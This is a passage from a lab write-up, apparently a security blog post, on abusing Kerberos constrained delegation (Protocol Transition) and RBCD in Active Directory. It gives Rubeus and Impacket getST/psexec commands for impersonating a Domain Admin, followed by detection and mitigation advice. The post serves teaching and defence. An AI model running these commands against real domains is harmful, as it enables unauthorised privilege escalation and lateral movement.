        {{< image src="/demystify_kerberos_delegation_attacks/6.png" position="center" style="border-radius: 8px;">}}

    2. **Rubeus now, having the TGT Ticket of the Computer Account "THEPUNISHER\$", sends a "KRB\_TGS\_REQ [(S4U2Self)](./demystify_kerberos_delegation.md#2-krb_tgs_req-s4u2self--s4uself-request)" to obtain a TGS Ticket on behalf of the user "MARVEL\Administrator" (Domain Admin) valid for the service itself.**

       <!-- only for spacing -->
       
        {{< image src="/demystify_kerberos_delegation_attacks/7.png" position="center" style="border-radius: 8px;">}}
        
        As we can note Rubeus sends a "KRB\_TGS\_REQ [(S4U2Self)](./demystify_kerberos_delegation.md#2-krb_tgs_req-s4u2self--s4uself-request)", analyzing the packet content one can observe that: 1) [Inside the "PA-FOR-USER"](./demystify_kerberos_delegation.md#111) data structure the request for the TGS Ticket on behalf of the user "MARVEL\Administrator" (it's a Domain Admin) is effectively present 2) [The Computer Account THEPUNISHER\$ is expressly indicated](./demystify_kerberos_delegation.md#31), in this way the issued TGS Ticket will be valid for ALL services started by that Service Account.

        {{< image src="/demystify_kerberos_delegation_attacks/8.png" position="center" style="border-radius: 8px;">}}
        <span id=3>

        The KDC [verifies](./demystify_kerberos_delegation.md#112) that the Service Account THEPUNISHER\$ has the "[TRUSTED\_TO\_AUTH\_FOR\_DELEGATION](./demystify_kerberos_delegation.md#102)" flag, and since the result is [positive](#2), the KDC issues the requested TGS Ticket (which belong to the user MARVEL\Administrator" & is valid for ALL services started by that Service Account), furthermore, i remind you that such a TGS Ticket issued in this positive case will have the "FORWARDABLE" flag set to "1".

        {{< image src="/demystify_kerberos_delegation_attacks/9.png" position="center" style="border-radius: 8px;">}}

    <span id=32>
    
    3. **Rubeus now that it has the TGS Ticket (belonging to the user MARVEL\Administrator") valid for the service itself, will be able to use it as "evidence" to invoke the "KRB\_TGS\_REQ ([S4UProxy](./demystify_kerberos_delegation.md#118))", in this way the attacker will obtain a TGS Ticket (still belonging to the user MARVEL\Administrator) valid for the HTTP service exposed on the SPIDERMAN machine (HTTP/SPIDERMAN), finally, Rubeus will replace the HTTP service with the CIFS service, obtaining a TGS Ticket (still belonging to the user MARVEL\Administrator") valid for the CIFS service exposed on the SPIDERMAN machine.**

        {{< image src="/demystify_kerberos_delegation_attacks/10.png" position="center" style="border-radius: 8px;">}}
    
        As we can see Rubeus sends a "KRB\_TGS\_REQ ([S4UProxy](./demystify_kerberos_delegation.md#118)", analyzing the content of the packet it can be ascertained that: 1) Inside the "Additional Ticket" field the [TGS Ticket previously received in the "S4USelf Response" is indeed sent](#37) 2) The SPN that points to the service which the compromised machine (Computer Account THEPUNISHER\$) is authorized to access on behalf of the Client (indicated in the ["msds-allowedtodelegateto" flag](#2)) is indicated, in fact the SPN "HTTP/SPIDERMAN.MARVEL.local" is present

        {{< image src="/demystify_kerberos_delegation_attacks/11.png" position="center" style="border-radius: 8px;">}}

        The KDC [verifies](./demystify_kerberos_delegation.md#51) if the TGS Ticket received inside the "additional-tickets" field (in addition to being valid) has the "FORWARDABLE" flag set to "1" & that inside the "[msds-allowedtodelegateto flag](#2)" parameter of the Service Account THEPUNISHER\$ the requested service is present, (so is in this case "HTTP/SPIDERMAN.MARVEL.local"), since the outcome is positive for both checks ([1](#3), [2](#2)), the KDC issues a TGS Ticket (belonging to the user MARVEL\Administrator") valid for the HTTP service exposed on the SPIDERMAN machine (furthermore, as for any other valid TGS Ticket this one will also have the "FORWARDABLE" flag set to "1").

         {{< image src="/demystify_kerberos_delegation_attacks/12.png" position="center" style="border-radius: 8px;">}}

         Finally, Rubeus will [modify](#4) the SPN field of the received TGS Ticket, replacing the HTTP service with the desired CIFS service, in this way the output TGS Ticket (belonging to the user MARVEL\Administrator") will have as SPN "CIFS/SPIDERMAN" and will therefore be valid for the CIFS service exposed on the SPIDERMAN machine, having done this Rubeus imports that Kerberos Ticket into memory.

        > If the attacker does NOT wish to replace the service of the TGS Ticket obtained via S4UProxy they will simply NOT include the ["altservice" parameter](#5) on Rubeus command, consequently, in this context we will obtain a TGS Ticket (belonging to the user MARVEL\Administrator") valid for the HTTP service present on the SPIDERMAN machine.

As you can see, following the Rubeus command we will have cached in memory a TGS Ticket belonging to the "Administrator" user valid for the CIFS service of the SPIDERMAN machine; in fact, performing a Network Logon with "PsExec" the OS will retrieve the cached TGS Ticket and use it to perform the authentication; in this way the attacker has succeeded in authenticating with administrative permissions to the SPIDERMAN computer.

{{< image src="/demystify_kerberos_delegation_attacks/13.png" position="center" style="border-radius: 8px;">}}

> The LogonID in this screenshot is different from that of the Sacrificial Process previously indicated simply because i have repeated this lab infinite times.

>  If you encounter an authentication error, try re-running the command by adding the ["msdsspn" parameter](#5) with a value that does not include the domain suffix, changing from "SPIDERMAN.MARVEL.local" to "SPIDERMAN"; in both cases it should still work because [both values are present within the "msds-allowedtodelegateto" property](#2), additionally, ensure that the same domain naming used in "msdsspn" is applied in the PsExec command (in this case), so if, for example, you request a TGS Ticket to access the SPIDERMAN.MARVEL.local machine, use the same naming to connect via PsExec.

## **Abuse Protocol Transition (User) - Windows**

Although Kerberos Delegation is typically applied to a "Computer Account" type Service Account, it can, (although it's a rare configuration) also be applied to a "[User](https://learn.microsoft.com/en-us/windows/win32/ad/user-object-attributes)" type Service Account (a traditional domain user).

If we identify a "[User](https://learn.microsoft.com/en-us/windows/win32/ad/user-object-attributes)" type Service Account (a traditional domain user) with ["Constrained Delegation (Use any authentication Protocol)](./demystify_kerberos_delegation.md#constrained-delegation-use-any-authentication-protocol--protocol-transition)" enabled, it is possible to execute the [same steps previously seen](#abuse-protocol-transition-computer---windows) to abuse this configuration.

In other words, if an attacker compromises a domain user acting as a Service Account and has "[Constrained Delegation (Use any authentication Protocol)](./demystify_kerberos_delegation.md#constrained-delegation-use-any-authentication-protocol--protocol-transition)" enabled, the attacker, impersonating this Service Account (domain user), could invoke the ["S4U2Self" & "S4U2Proxy"](./demystify_kerberos_delegation.md#100) extensions and thereby obtain a TGS Ticket belonging to ANY domain user and valid to access ANY ([usually](#1)) Back-End service for which the Service Account (domain user) has authorization to access on behalf of the Client (as indicated in the "[msds-allowedtodelegateto](./demystify_kerberos_delegation.md#101)" flag).

**To save both my and your lifetime, instead of re-executing ALL the following steps as previously done, i will report only the essential steps:**

1. **Identify which Service Accounts have "Constrained Delegation (Use any authentication Protocol)" enabled (in this scenario, we are looking for a "User" type object, so a traditional domain user acting as a Service Account).**
    <span id=6>
    
    ```
    PS C:\> Get-DomainUser --TrustedToAuth
    ```

    {{< image src="/demystify_kerberos_delegation_attacks/14.png" position="center" style="border-radius: 8px;">}}

    As you can see, the "User" (traditional domain user) delegationuser has the "TRUSTED\_TO\_AUTH\_FOR\_DELEGATION" flag and therefore has Constrained Delegation (Use any authentication Protocol) enabled; specifically, this user (so "delegationuser") and therefore ALL services started with it (in this case the "delegationuser" Service Account has the SPN LDAP/WORKSTATION01 so it will run only the LDAP service on that machine) will be able to authenticate on behalf of the Client exclusively to the SPN "HTTP/SPIDERMAN", so, to the HTTP service of the SPIDERMAN machine.

    Indeed, inspecting the "Delegation" tab of the "User" delegationuser via ADUC, you will find this configuration.

    {{< image src="/demystify_kerberos_delegation_attacks/15.png" position="center" style="border-radius: 8px;">}}
    <br>
    {{< image src="/demystify_kerberos_delegation_attacks/16.png" position="center" style="border-radius: 8px;">}}

2. **The attacker compromises the Service Account with Constrained Delegation (Use any authentication Protocol) enabled.**

    In this scenario, the attacker has managed to obtain, for example via Password Spray, the credentials of the "delegationuser" account, so the Service Account with Constrained Delegation (Use any authentication Protocol) enabled.
    
3. **The attacker obtains a TGS Ticket (of a Domain Admin) valid to authenticate to the CIFS service hosted on the SPIDERMAN machine (that is, the machine authorized in the "[msds-allowedtodelegateto" flag](#6)).**

    The attacker, now possessing the credentials of the "delegateduser" Service Account, since it has "Constrained Delegation (Use any authentication Protocol)", can abuse it to invoke the S4U2Self & S4U2Proxy extensions and thus obtain a TGS Ticket belonging to a Domain Admin user valid to access the HTTP service of the SPIDERMAN machine ([so, the service specified by "msds-allowedtodelegateto" flag](#6)); furthermore, in this scenario, the attacker decides to replace the SPN "HTTP/SPIDERMAN" with the SPN "CIFS/SPIDERMAN", managing in this way to authenticate via PsExec to the SPIDERMAN machine.

    Since we will inject the desired TGS Ticket into memory, we first use the socalled Sacrificial Process, then execute the following Rubeus command within the Sacrificial Process.

    ```
    C:\> Rubeus.exe s4u /impersonateuser:<User_To_Impersonate> /msdsspn:<SPN_inside_in_msds-allowedtodelegateto> /altservice:<Desidered_SPN> /user:<Service_Account> /rc4:<NTHash_Service_Account> /nowrap /ptt
    ```

Let’s analyze in summary all the operations performed by Rubeus.

1) **Rubeus sent a "KRB\_AS\_REQ" to obtain the TGT of the Service Account (domain user) delegateduser, information necessary to invoke the "KRB\_TGS\_REQ (S4USelf)" (it happens regardless of whether the Service Account is a Computer Account or a traditional domain user).**

    {{< image src="/demystify_kerberos_delegation_attacks/17.png" position="center" style="border-radius: 8px;">}}

2) **Rubeus now, having the TGT Ticket of the "User" delegationuser, sends a "KRB\_TGS\_REQ (S4USelf)" to obtain a TGS Ticket on behalf of the "MARVEL\Administrator" user (Domain Admin) valid for the service itself.**

    {{< image src="/demystify_kerberos_delegation_attacks/18.png" position="center" style="border-radius: 8px;">}}

3) **Rubeus now that it has the TGS Ticket (belonging to the "MARVEL\Administrator" user) valid for the service itself, will be able to use it as "evidence" to invoke the "KRB\_TGS\_REQ (S4UProxy)"; in this way the attacker obtains a TGS Ticket (still belonging to the "MARVEL\Administrator" user) valid for the HTTP service exposed on the SPIDERMAN machine (HTTP/SPIDERMAN), finally, Rubeus will replace the HTTP service with the CIFS service, obtaining a TGS Ticket (still belonging to the "MARVEL\Administrator" user) valid for the CIFS service exposed on the SPIDERMAN machine.**

    {{< image src="/demystify_kerberos_delegation_attacks/19.png" position="center" style="border-radius: 8px;">}}

As you can see, following the Rubeus command we will have cached in memory a TGS Ticket belonging to the "Administrator" user valid for the CIFS service of the SPIDERMAN machine; in fact, when performing a Network Logon with "PsExec" the OS will retrieve the cached TGS Ticket and use it for authentication; in this way, the attacker has successfully authenticated with administrative privileges to the SPIDERMAN machine.

{{< image src="/demystify_kerberos_delegation_attacks/20.png" position="center" style="border-radius: 8px;">}}

## **Abuse Protocol Transition (Computer) - Linux**

In this scenario we will see how to exploit a Constrained Delegation (Use any authentication Protocol) (also called Protocol Transition) from a Linux machine.

1. **Identify which Service Accounts have "Constrained Delegation (Use any authentication Protocol)" enabled (in this scenario we are looking for Computer Accounts acting as Service Accounts)**

    There are different methods to identify which Service Accounts have "Constrained Delegation (Use any authentication Protocol)", on Linux one of the most common is using "[findDelegation](https://github.com/fortra/impacket/blob/master/examples/findDelegation.py)":

    ```
    PS C:\> impacket-findDelegation -dc-ip <DC_IP> <domain><user>:<password>
    ```
    {{< image src="/demystify_kerberos_delegation_attacks/88.png" position="center" style="border-radius: 8px;">}}

    This tool will perform an LDAP query to the DC and return as a result ALL the Service Accounts that have been configured with Kerberos Delegation, specifically:

    <span id=101>

	- AccounType: Indicates if the Service Account in question is a Computer Account or a traditional domain user account
	
	- DelegationType: Indicates which type of Kerberos Delegation has been configured for that specific Service Account
	
		- Unconstrained: [Unconstrained Delegation](./demystify_kerberos_delegation.md#unconstrained-delegation)
		- Constrained: [Constrained Delegation (Kerberos Only)](./demystify_kerberos_delegation.md#constrained-delegation-kerberos-only)
		- Constrained w/ Protocol Transition: [Constrained Delegation (Use any authentication Protocol) (also called Protocol Transition)](./demystify_kerberos_delegation.md#constrained-delegation-use-any-authentication-protocol--protocol-transition)
		- Resource-Based Constrained: [Resource Based Constrained Delegation (RBCD)](./demystify_kerberos_delegation.md#resource-based-constrained-delegation-rbcd)

	- DelegationRightsTo: Indicates that the Service Account present in AccountName has permissions to authenticate on behalf of the Client to that system.
	
        > In Unconstrained & Constrained Delegation it reports the value contained in the property "msds-allowedtodelegateto" of the Service Account contained in the "AccountName" column.
        In RBCD instead it reports the Service Account that has within its ms-DS-Allowed-To-Act-On-Behalf-Of-Other-Identity property the Service Account contained in the "AccountName" column.

2. **The attacker compromises the Service Account with [Constrained Delegation (Use any authentication Protocol)](./demystify_kerberos_delegation.md#constrained-delegation-use-any-authentication-protocol--protocol-transition) enabled.**

    In this scenario the attacker succeeded in authenticating with administrative privileges to the machine THEPUNISHER and, by dumping the LSA Secrets, obtained the credentials of the Computer Account THEPUNISHER$, that is, the Service Account with Constrained Delegation (Use any authentication Protocol) enabled.

    {{< image src="/demystify_kerberos_delegation_attacks/89.png" position="center" style="border-radius: 8px;">}}

3. **The attacker obtains a TGS Ticket (of a Domain Admin) valid to authenticate to the CIFS service hosted on the machine SPIDERMAN (so, to the machine authorized in the "msds-allowedtodelegateto" flag)**

    The attacker now that he possesses the credentials of the Service Account THEPUNISHER$, given that this one has "Constrained Delegation (Use any authentication Protocol)", can impersonate it to invoke the S4U2Self & S4U2Proxy extensions and thus obtain a TGS Ticket belonging to a Domain Admin user valid to access the HTTP service of the machine SPIDERMAN (so, what is specified in the "msds-allowedtodelegateto" flag), furthermore, in this scenario the attacker decides to replace the SPN "HTTP/SPIDERMAN" with the SPN "CIFS/SPIDERMAN" thereby managing to authenticate via PsExec to the machine SPIDERMAN.

    To perform this it is possible to use the impacket [getST](https://github.com/fortra/impacket/blob/master/examples/getST.py) tool, specifically with the following command:

    ```
    # impacket-getST -spn <SPN_within_in_msds-allowedtodelegateto> '<domain>/<Service_Account>' -impersonate <User_To_Impersonate> -dc-ip <DC_IP> -hashes <LMHash>:<NTHash> -altservice <SPN_desired>
    ```
    
    {{< image src="/demystify_kerberos_delegation_attacks/90.png" position="center" style="border-radius: 8px;">}}

    Let's [SUMMARILY](#401) analyze all the operations performed by getST.

    1. Impacket getST, since it does NOT find a ".cache" file related to the Service Account's TGT Ticket, sends a "KRB_AS_REQ" to obtain precisely the TGT Ticket of the Computer Account THEPUNISHER$, information necessary to invoke the "KRB_TGS_REQ (S4USelf)"

        {{< image src="/demystify_kerberos_delegation_attacks/91.png" position="center" style="border-radius: 8px;">}}
	   
    2. Impacket getST, now that it has the TGT Ticket of the Computer Account "THEPUNISHER$", sends a "KRB_TGS_REQ (S4USelf)" to obtain a TGS Ticket on behalf of the user "MARVEL\Administrator" (Domain Admin) valid for the service itself.

        {{< image src="/demystify_kerberos_delegation_attacks/92.png" position="center" style="border-radius: 8px;">}}

    3. Impacket getST now that it has the TGS Ticket (belonging to the user MARVEL\Administrator") valid for the service itself, it can use it as "evidence" to invoke the "KRB_TGS_REQ (S4UProxy)", in this way the attacker will obtain a TGS Ticket (still belonging to the user MARVEL\Administrator") valid for the HTTP service exposed on the machine SPIDERMAN (HTTP/SPIDERMAN).

        {{< image src="/demystify_kerberos_delegation_attacks/93.png" position="center" style="border-radius: 8px;">}}

        Finally, Impacket getST will modify the SPN field of the received TGS Ticket, replacing the HTTP service with the desired CIFS service, in this way the output TGS Ticket (belonging to the user MARVEL\Administrator") will have as SPN "CIFS/SPIDERMAN" and will therefore be valid for the CIFS service exposed on the machine SPIDERMAN, after that getST will export that Kerberos Ticket in the form of a file "\<user\>\@\<service\>\_\<hostname\>\@\<domain\>.ccache"; indeed we will have a file called "Administrator@[CIFS_SPIDERMAN@MARVEL.LOCAL.ccache](mailto:CIFS_SPIDERMAN@MARVEL.LOCAL.ccache)"

        {{< image src="/demystify_kerberos_delegation_attacks/94.png" position="center" style="border-radius: 8px;">}}

    > If the attacker does NOT wish to replace the service of the TGS Ticket obtained via S4UProxy they will simply NOT insert the "altservice" parameter, consequently, in this context we will obtain a TGS Ticket (belonging to the user MARVEL\Administrator") valid for the HTTP service present on the machine SPIDERMAN ([usefull for a potential WinRM Service](#48) running and present on the SPIDERMAN machine).

Now we could, for example, use the Impacket suite to access the machine SPIDERMAN via [PsExec](https://github.com/fortra/impacket/blob/master/examples/psexec.py); in this example we will use Impacket's "psexec" (you can also use "smbexec.py"), therefore you need to set an environment variable named "KRB5CCNAME" and make it contain the file just created, so the TGS Ticket.

```
# export KRB5CCNAME=./<user>@<service>_<hostname>@<domain>.ccache
```
{{< image src="/demystify_kerberos_delegation_attacks/95.png" position="center" style="border-radius: 8px;">}}

Then use, for example, Impacket's "[PsExec](https://github.com/fortra/impacket/blob/master/examples/psexec.py)" to perform the authentication, in this way the attacker will manage to authenticate with administrative privileges to the machine SPIDERMAN.

```
# impacket-psexec -k -no-pass <hostname>
```
{{< image src="/demystify_kerberos_delegation_attacks/96.png" position="center" style="border-radius: 8px;">}}

> In the lab, the LINUX machine is NOT domain-joined, as it simulates an attacker who managed to connect to the network with their own Linux attacking machine, and therefore, even if NOT domain-joined, it still has connectivity to the DC; to bypass this issue, the target hostname resolution must be set in the "/etc/hosts" file.

## **Abuse Protocol Transition - Detect & Mitigation**

**Detect**

Ask your SIEM / Detection Engineer to create a [detection rule](https://learn.microsoft.com/en-us/defender-xdr/custom-detection-rules) ad hoc 😝

Jokes aside, for an high overview i suggest you to start using an Identity Monitoring Solution (e.g. [Defender for Identity](https://learn.microsoft.com/en-us/defender-for-identity/what-is)) and only after that to perform a [deep dive into a custom rule](https://labs.lares.com/fear-kerberos-pt4/#abusingkerberosonly/).

**Mitigation**

Although this type of attack cannot be completely prevented since it exploits how Kerberos Delegation works, there are some mitigations that can help avoid serious impacts following an Abuse Protocol Transition attack; these generally work by applying protection to domain accounts, ensuring that they CANNOT be delegated.

This can be achieved using the following measures:

- **Configure the property "Account is sensitive and cannot be delegated" on privileged accounts.**

    {{< image src="/demystify_kerberos_delegation_attacks/117.png" position="center" style="border-radius: 8px;">}}

    This configuration will set the NOT_DELEGATED flag (contained in the "[UserAccountControl](./demystify_kerberos_delegation.md#11)" property) of the account to "1", and therefore this account CANNOT be delegated.

    With the following command, which analyzes this flag, we can verify if it's NOT set to 0 and therefore that this account can no longer be delegated:

    ```
    PS C:\> Get-ADUser -Identity <account> -Properties UserAccountControl | Select-Object @{Name='NOT_DELEGATED';Expression={($_.UserAccountControl -band 0x100000)}}
    ```

    {{< image src="/demystify_kerberos_delegation_attacks/119.png" position="center" style="border-radius: 8px;">}}

    > This configuration will also work on the account with RID 500, with that i mean the local "Administrator" account of the DC which has also become a privileged domain account (since among the various groups it is also part of the Domain Admins group).

- **Add privileged accounts to the "[Protected Users Group](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/dn466518(v=ws.11))"**

    {{< image src="/demystify_kerberos_delegation_attacks/118.png" position="center" style="border-radius: 8px;">}}

    Accounts contained within the "Protected Users Group" will NOT be able to:

    1. Perform NTLM authentication (preventing them from becoming victims of NTLM Hash theft / NTLM Relay)
     

    2. Use DES or RC4 encryption types in Kerberos Pre-Authentication (by enforcing only strong encryption types, the AS-REP Roasting attack will be mitigated, since the attacker often performs an encryption downgrade in such a scenario). 
    3. Be delegated in an Unconstrained Delegation, Constrained Delegation (Kerberos Only), Constrained Delegation (Use any authentication protocol) / Protocol Transition, or Resource-Based Constrained Delegation (RBCD)

    If a domain administrator configures all privileged accounts within this group, the attacker will therefore NOT be able to impersonate them in an Abuse Protocol Transition attack.

    > If an account is part of the "[Protected Users Group](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/dn466518(v=ws.11))," the DC will NOT indirectly assign the NOT_DELEGATED flag on the account property; simply being part of this group will make it impossible to delegate that account. The only [exception](https://sensepost.com/blog/2023/protected-users-you-thought-you-were-safe-uh/) is the account with RID 500, which, in order to be protected, must necessarily have the property "Account is sensitive and cannot be delegated" enabled (which sets the NOT_DELEGATED flag to 1).


## **Abuse Protocol Transition (User) - Linux**

Although Kerberos Delegation is generally applied to a Service Account of type "Computer Account", in reality, even if rarely, [it can also be applied to a Service Account of type "User" (traditional domain user account)](./demystify_kerberos_delegation.md#1001).

If we identify a Service Account of type "User" (traditional domain user account) with "Constrained Delegation (Use any authentication Protocol)" enabled, it is possible to perform the same steps [previously](#abuse-protocol-transition-computer---linux) seen to abuse this configuration.

In other words, if an attacker compromises a domain user that acts as a Service Account and has "Constrained Delegation (Use any authentication Protocol)" enabled, the attacker, impersonating this Service Account (domain user), could invoke the S4U2Self & S4U2Proxy extensions and thus obtain a TGS Ticket belonging to ANY domain user and valid to access ANY ([usually](#1)) back-end service that the Service Account (domain user) is authorized to access on behalf of the Client (indicated in the "msds-allowedtodelegateto" flag).

We therefore [re-execute the same steps previously seen](#abuse-protocol-transition-computer---linux):

1. **Identify which Service Accounts have "Constrained Delegation (Use any authentication Protocol)" enabled (in this scenario we are looking for an object of type "User", so a traditional domain user, acting as a Service Account)**

    There are different methods to identify which Service Accounts have "Constrained Delegation (Use any authentication Protocol)", on Linux one of the most common is using "[findDelegation](https://github.com/fortra/impacket/blob/master/examples/findDelegation.py)":

    ```
    PS C:> impacket-findDelegation -dc-ip <DC_IP> <domain><user>:<password>
    ```
    {{< image src="/demystify_kerberos_delegation_attacks/97.png" position="center" style="border-radius: 8px;">}}

    [In summary](#101), in our example, analyzing the output we identify that the traditional domain user "delegatiouser" has Protocol Transition enabled, specifically ALL services started with it (in this case the Service Account "User" has the SPN LDAP/WORKSTATION01 and therefore will run the LDAP service on that machine; the fact that this machine does NOT exist in my lab is irrelevant for the purpose of the exploitation) will be able to authenticate on behalf of the Client exclusively towards the SPN "HTTP/SPIDERMAN" & "HTTP/SPIDERMAN.MARVEL.local", so to the HTTP service of the machine SPIDERMAN.

2. **The attacker compromises the Service Account with Constrained Delegation (Use any authentication Protocol) enabled.**

    In this scenario the attacker managed to retrieve, for example via Password Spray, the credentials of the user "delegationuser", so the Service Account with Constrained Delegation (Use any authentication Protocol) enabled.

3. **The attacker obtains a TGS Ticket (of a Domain Admin) valid to authenticate to the CIFS service hosted on the machine SPIDERMAN (so, to the machine authorized in the "msds-allowedtodelegateto" flag)**

    The attacker now, having the credentials of the Service Account "delegateuser", given that this one has "Constrained Delegation (Use any authentication Protocol)", can impersonate it to invoke the S4U2Self & S4U2Proxy extensions and thus obtain a TGS Ticket belonging to a Domain Admin user valid to access the HTTP service of the machine SPIDERMAN (so, what is specified in the "msds-allowedtodelegateto" flag); furthermore, in this scenario the attacker decides to replace the SPN "HTTP/SPIDERMAN" with the SPN "CIFS/SPIDERMAN", thereby managing to authenticate via PsExec to the machine SPIDERMAN.

    To perform this it is possible to use the impacket [getST](https://github.com/fortra/impacket/blob/master/examples/getST.py) tool, specifically with the following command:

    ```
    # impacket-getST -spn <SPN_contenuto_in_msds-allowedtodelegateto> '<domain>/<Service_Account>' -impersonate <User_To_Impersonate> -dc-ip <DC_IP> -hashes <LMHash>:<NTHash> -altservice <SPN_desiderato>
    ```

    {{< image src="/demystify_kerberos_delegation_attacks/98.png" position="center" style="border-radius: 8px;">}}

    Let's [SUMMARILY](#401) analyze all the operations performed by getST.

    1. Impacket getST, since it does NOT find a ".cache" file related to the Service Account's TGT Ticket, sends a "KRB_AS_REQ" to obtain precisely the TGT Ticket of the traditional domain user "delegationuser", information necessary to invoke the "KRB_TGS_REQ (S4USelf)" (The Service Account's TGT Ticket is necessary to invoke the "KRB_TGS_REQ (S4USelf)", this is independent of whether the Service Account is a Computer Account or a traditional domain user).

        {{< image src="/demystify_kerberos_delegation_attacks/99.png" position="center" style="border-radius: 8px;">}}

    2. Impacket getST, now that it has the TGT Ticket of the "User" "delegationuser", sends a "KRB_TGS_REQ (S4USelf)" to obtain a TGS Ticket on behalf of the user "MARVEL\Administrator" (Domain Admin) valid for the service itself.

        {{< image src="/demystify_kerberos_delegation_attacks/100.png" position="center" style="border-radius: 8px;">}}

    3. Impacket getST, now that it has the TGS Ticket (belonging to the user MARVEL\Administrator") valid for the service itself, can use it as "evidence" to invoke the "KRB_TGS_REQ (S4UProxy)", in this way the attacker will obtain a TGS Ticket (still belonging to the user MARVEL\Administrator") valid for the HTTP service exposed on the machine SPIDERMAN (HTTP/SPIDERMAN).

        {{< image src="/demystify_kerberos_delegation_attacks/101.png" position="center" style="border-radius: 8px;">}}
    
        Finally, Impacket getST will modify the SPN field of the received TGS Ticket, replacing the HTTP service with the desired CIFS service, in this way the output TGS Ticket (belonging to the user MARVEL\Administrator") will have as SPN "CIFS/SPIDERMAN" and will therefore be valid for the CIFS service exposed on the machine SPIDERMAN; after that, getST will export this Kerberos Ticket in the form of a file "\<user\>\@\<service\>\_\<hostname\>\@\<domain\>\.ccache"; indeed, we will have a file called "Administrator@[CIFS_SPIDERMAN@MARVEL.LOCAL.ccache](mailto:CIFS_SPIDERMAN@MARVEL.LOCAL.ccache)".

        {{< image src="/demystify_kerberos_delegation_attacks/102.png" position="center" style="border-radius: 8px;">}}
    
    > If the attacker does NOT wish to replace the service of the TGS Ticket obtained via S4UProxy, they will simply NOT include the "altservice" parameter; consequently, in this context we will obtain a TGS Ticket (belonging to the user MARVEL\Administrator") valid for the HTTP service present on the machine SPIDERMAN ([usefull for a potential WinRM Service](#48) running and present on the SPIDERMAN machine).

Now we could, for example, use the Impacket suite to access the machine SPIDERMAN via PsExec; in this example we will use Impacket's "psexec" (you can also use "smbexec.py"), therefore you need to set an environment variable named "KRB5CCNAME" and make it contain the file just created, so the TGS Ticket.

```
# export KRB5CCNAME=./<user>@<service>_<hostname>@<domain>.ccache
```
{{< image src="/demystify_kerberos_delegation_attacks/103.png" position="center" style="border-radius: 8px;">}}

Then use, for example, Impacket's "psexec" to perform the authentication; in this way the attacker will manage to authenticate with administrative privileges to the machine SPIDERMAN.

```
# impacket-psexec -k -no-pass <hostname>
```
{{< image src="/demystify_kerberos_delegation_attacks/104.png" position="center" style="border-radius: 8px;">}}

> In the lab, the LINUX machine is NOT domain-joined, as it simulates an attacker who managed to connect to the network with their own Linux attacking machine, and therefore, even if NOT domain-joined, it still has connectivity to the DC; to bypass this issue, the target hostname resolution must be set in the "/etc/hosts" file.

## **Abuse RBCD via DACL**

Several techniques exist to exploit RBCD, below we will analyze by far the most common.

Since the trigger of a "Resource Based Constrained Delegation (RBCD)" is based on "[ms-DS-Allowed-To-Act-On-Behalf-Of-Other-Identity](https://learn.microsoft.com/en-us/windows/win32/adschema/a-msds-allowedtoactonbehalfofotheridentity?ref=labs.lares.com)", which is nothing more than a property of a "Secureable Objects", [if the attacker has write permissions on this property (e.g: GenericalAll, GenericWrite and so on)](./demystify_kerberos_delegation.md#123), they could exploit a DACL Misconfiguration to configure an RBCD on an arbitrary target and potentially compromise it.

> In summary, Active Directory contains [entities called "Objects"](https://www.windows-active-directory.com/active-directory-objects-list.html) (Computers, Users, OUs, GPOs, Files, etc.) which for the vast majority are "Secureable Objects".
>
>[Secureable Objects](https://learn.microsoft.com/en-us/windows/win32/secauthz/securable-objects) are resources protected through Access Control and each "Secureable Object" has a Security Descriptor containing a [DACL (Discretionary Access Control List) and a SACL (System Access Control list (SACL)](https://learn.microsoft.com/en-us/windows/win32/secauthz/access-control-lists):
>
>* The DACL (it contain a series of ACE - Access Control Entries) manages who can do what.
>* The SACL (it contain a series of ACE - Access Control Entries) logs audit events.
>
> When a "Secureable Object" performs an action within Active Directory toward another "Secureable Object" , the Domain Controller (that manages the AD) inspects the DACL to determine permissions and, consequently, if the action is allowed. 
>
>So a "[DACL Misconfiguration](https://labs.lares.com/securing-active-directory-via-acls/)" is simply a DACL containing ACLs that grant excessive permissions which could allows potential attacks, like in this case 😉​

An attacker in order to abuse RBCD via DACL requires 2 mandatory elements:

1. The attacker (impersonating a "Computer Account" or a "Domain User") must have write permissions available (WriteProperty, Generic Write, Generic All, Write DACL, Write Owner, Own) on the attribute "[ms-DS-Allowed-To-Act-On-Behalf-Of-Other-Identity](https://learn.microsoft.com/en-us/windows/win32/adschema/a-msds-allowedtoactonbehalfofotheridentity)" of an:

    - Object of type "Computer" (so the related Computer Account) 

    - Object type "Users" (a traditional "Domain User" - [must have an SPN set](./demystify_kerberos_delegation.md#130))
    
     In this way the attacker is able to configure an RBCD with an arbitrary value within the target's attribute.

> In my lab and i was not able to successfully compromise a "Users" Object.

2. The attacker needs to control an account that is capable of invoking the "S4USelf" and "S4UProxy" extensions in order to exploit the previously configured RBCD, this can be done with a:

    - "Computer Account": Any "Computer Account" is able to arbitrary invoke the "S4USelf" and "S4UProxy".
    <span id=7>

    - "Domain user": Any "User" with a SPN setted is able to arbitrary invoke the "S4USelf" and "S4UProxy (unless the "SPN-less" technique is used [1](https://www.tiraniddo.dev/2022/05/exploiting-rbcd-using-normal-user.html) - [2](https://medium.com/@offsecdeer/a-practical-guide-to-rbcd-exploitation-a3f1a47267d5) BUT using this technique the "Domain User" used will become unavailable, so it's better to avoid this attack)

If both conditions are satisfied, **an attacker could arbitrarily configure a malicious RBCD on the target, this action would allow the attacker access to ANY to service executed by the service account for which the RBCD was configured impersonating ANY domain user.**

<span id=9>

**The following scenario covers the most common case where an attacker is able to satisfy the condition previusly indicated:**

1) **The attacker impersonating a "Domain User" has write permissions on the "ms-DS-Allowed-To-Act-On-Behalf-Of-Other-Identity" attribute of an object of Computer type (so on the related Computer Account)**; in this way the attacker is able to configure on it an RBCD with an arbitrary value within the target attribute.

> **The attack can be carried out regardless of whether the target "Computer" object already has Unconstrained / Constrained Delegation enabled**, [because](#20) the KDC, after the checks performed on the Computer Account created by the attacker (which simulates the AP Front End service), will switch in any case to RBCD and therefore issue a TGS Ticket valid to authenticate to the service hosted on the target "Computer" object.

<span id=51>

2) **An attacker usually uses a "Computer Account" to invoke the "S4USelf" and "S4UProxy" extensions to exploit the previously configured RBCD**; it happens because every existing Computer Account has by default an SPN configured and thus it can arbitray invoke the "S4USelf" and "S4UProxy" kerberos extension ([it's more uncommon the scenario that applies to a "Domain User"](#7))

    An attacker in order to compromise a "Computer Account" could:

   - Compromise a Computer and retrieve its related Computer Account
